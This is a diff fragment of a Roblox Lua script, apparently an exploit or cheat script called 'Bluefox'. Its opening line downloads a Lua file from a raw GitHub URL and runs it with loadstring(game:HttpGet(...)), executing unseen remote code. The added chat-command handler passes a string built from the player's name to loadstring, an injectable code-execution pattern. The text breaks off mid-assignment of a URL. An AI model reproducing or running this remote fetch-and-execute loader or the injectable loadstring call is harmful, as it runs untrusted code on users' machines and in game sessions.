@@ -1,4 +1,43 @@
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thunderisdead/bluefoxscript/main/bluefox%20script.lua"))()
+
+
+
+local chatBotPrefix = "!!"
+
+local chatResponses = {
+    Bloo = {
+        "Enabled",
+    },
+}
+
+local function replacePlaceholders(inputString, playerName)
+    return inputString:gsub("%(username%)", playerName)
+end
+
+local function onChatted(player, message)
+    local lowercaseMessage = string.lower(message)
+    if lowercaseMessage:sub(1, 2) == chatBotPrefix then
+        local command = lowercaseMessage:sub(3)
+
+        if string.find(command, "fmlk", 1, true) then
+            local username = player.Name
+            local path = "game:GetService(\"Workspace\")[\"" .. username .. "\"].Head.NameTag.Main.VIW"
+            local target = assert(loadstring("return " .. path))()
+
+            if target:IsA("TextLabel") then
+                target.Text = "(Bluefox)"
+            end 
+
+           
+        end
+    end
+end
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        onChatted(player, msg)
+    end)
+end
 	local HTTP_ = game:GetService('HttpService')
 	local LPR = game:GetService('Players').LocalPlayer
 	local url =
